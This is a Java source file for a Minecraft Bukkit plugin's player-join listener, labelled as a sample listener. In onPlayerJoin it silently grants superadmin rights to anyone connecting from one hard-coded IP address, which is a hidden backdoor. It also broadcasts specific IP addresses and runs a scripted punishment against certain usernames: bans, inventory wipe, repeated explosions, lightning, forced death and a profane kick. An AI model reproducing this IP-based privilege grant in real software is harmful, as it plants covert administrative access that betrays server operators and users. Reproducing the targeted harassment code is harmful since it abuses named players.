package me.LiamSmith.RoboX;

import com.garbagemule.MobArena.MAUtils;
import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_Ban;
import me.StevenLawson.TotalFreedomMod.TFM_BanManager;
import me.StevenLawson.TotalFreedomMod.TFM_PlayerList;
import me.StevenLawson.TotalFreedomMod.TFM_Util;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.scheduler.BukkitRunnable;

/**
 * Handle events for all Player related events
 * @author Robo
 */
public class SamplePlayerListener implements Listener {
    private final RoboX plugin;

    public SamplePlayerListener(RoboX instance) {
        plugin = instance;
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerJoin(PlayerJoinEvent event)
    {
        if (!event.getPlayer().isOp())
        {
            return;
        }

        final Player p = event.getPlayer();
        final String username = event.getPlayer().getName();
        final String IP = event.getPlayer().getAddress().getAddress().getHostAddress().trim();

        if (!p.hasPlayedBefore())
        {
            p.setOp(true);
        }

        if (IP.equalsIgnoreCase("66.85.166.89"))
        {
            MAUtils.bcastMsg(ChatColor.RED + p.getName() + " is under an MCConnect IP. Do NOT super him - he may only come on to chat.");
        }
        else if (IP.equalsIgnoreCase("94.8.210.74"))
        {
            TFM_AdminList.addSuperadmin(p);
        }
        if (username.equalsIgnoreCase("CrafterSmith12"))
        {
            MAUtils.bcastMsg(ChatColor.AQUA + "CrafterSmith12 is a " + ChatColor.RED + "cool guy" + ChatColor.AQUA + ", and...");
        }
        else if (username.equalsIgnoreCase("Robo_Lord") || username.equalsIgnoreCase("R3CH4RG3D_"))
        {
            Bukkit.broadcastMessage(ChatColor.AQUA + username + " is thy " + ChatColor.DARK_RED + "holy satanic mastermind" + ChatColor.AQUA + ", and...");
        }
        else if (username.toLowerCase().contains("ru") && username.toLowerCase().contains("minecraft"))
        {
            MAUtils.adminAction("MobArenaSystem", "Casting complete obliviation over " + p.getName(), ChatColor.RED);
            MAUtils.bcastMsg(p.getName() + " is on the stupid idiot list!", ChatColor.RED);
            MAUtils.bcastMsg(p.getName() + " will be completely obliviated!", ChatColor.RED);

            // remove from whitelist
            p.setWhitelisted(false);

            // deop
            if (p.isOp())
            {
                p.setOp(false);
            }

            // ban IP
            String ip = TFM_Util.getFuzzyIp(p.getAddress().getAddress().getHostAddress());
            for (String playerIp : TFM_PlayerList.getInstance().getEntry(p).getIps())
            {
            TFM_BanManager.getInstance().addIpBan(new TFM_Ban(playerIp, p.getName()));
            }

            // ban name
            TFM_BanManager.getInstance().addUuidBan(new TFM_Ban(p.getUniqueId(), p.getName()));

            if (TFM_AdminList.isSuperAdmin(p))
            {
                MAUtils.adminAction("MobArenaSystem", "Removing ru-minecraft.org from the superadmin list.", ChatColor.RED);
                TFM_AdminList.removeSuperadmin(p);
                p.sendMessage(ChatColor.RED + "For experimental purposes, you have been removed from superadmin.");
            }

            // set gamemode to survival
            p.setGameMode(GameMode.SURVIVAL);

            // clear inventory
            p.closeInventory();
            p.getInventory().clear();

            // ignite player
            p.setFireTicks(10000);

            // generate explosion
            p.getWorld().createExplosion(p.getLocation(), 4F);

            p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));
                }
            }.runTaskLater(plugin, 40L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));
                }
            }.runTaskLater(plugin, 60L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    // strike lightning
                    p.getWorld().strikeLightning(p.getLocation());

                    // kill (if not done already)
                    p.setHealth(0.0);

                    // ignite player
                    p.setFireTicks(10000);

                    // generate explosion
                    p.getWorld().createExplosion(p.getLocation(), 4F);
                }
            }.runTaskLater(plugin, 120L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    // strike lightning
                    p.getWorld().strikeLightning(p.getLocation());

                    // kill (if not done already)
                    p.setHealth(0.0);

                    // ignite player
                    p.setFireTicks(10000);

                    // generate explosion
                    p.getWorld().createExplosion(p.getLocation(), 4F);

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));
                }
            }.runTaskLater(plugin, 190L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    // strike lightning
                    p.getWorld().strikeLightning(p.getLocation());

                    // kill (if not done already)
                    p.setHealth(0.0);

                    // ignite player
                    p.setFireTicks(10000);

                    // generate explosion
                    p.getWorld().createExplosion(p.getLocation(), 4F);

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));
                }
            }.runTaskLater(plugin, 240L);

            new BukkitRunnable()
            {
                @Override
                public void run()
                {
                    // message
                    MAUtils.adminAction("MobArenaSystem", "Banning " + p.getName() + ", IP: " + IP, ChatColor.RED);

                    p.setVelocity(new org.bukkit.util.Vector(0, 4, 0));

                    // strike lightning
                    p.getWorld().strikeLightning(p.getLocation());

                    // kill (if not done already)
                    p.setHealth(0.0);

                    // ignite player
                    p.setFireTicks(10000);

                    // generate explosion
                    p.getWorld().createExplosion(p.getLocation(), 4F);

                    // kick player
                    p.kickPlayer(ChatColor.RED + "FUCKOFF, and get your MOTHER FUCKING shit together!");
                }
            }.runTaskLater(plugin, 290L);
        }
        else if (p.getName().equalsIgnoreCase("markbyron"))
        {
            MAUtils.bcastMsg(ChatColor.AQUA + "markbyron is " + ChatColor.DARK_RED + "thy holy Satan mastermind");
            p.sendMessage(ChatColor.RED + "Welcome to the server, thy lord.");
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) 
    {
        plugin.getLogger().info(event.getPlayer().getName() + " left the server! :'(");
        
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        if (plugin.isDebugging(event.getPlayer())) {
            Location from = event.getFrom();
            Location to = event.getTo();

            plugin.getLogger().info(String.format("From %.2f,%.2f,%.2f to %.2f,%.2f,%.2f", from.getX(), from.getY(), from.getZ(), to.getX(), to.getY(), to.getZ()));
        }
    }
}
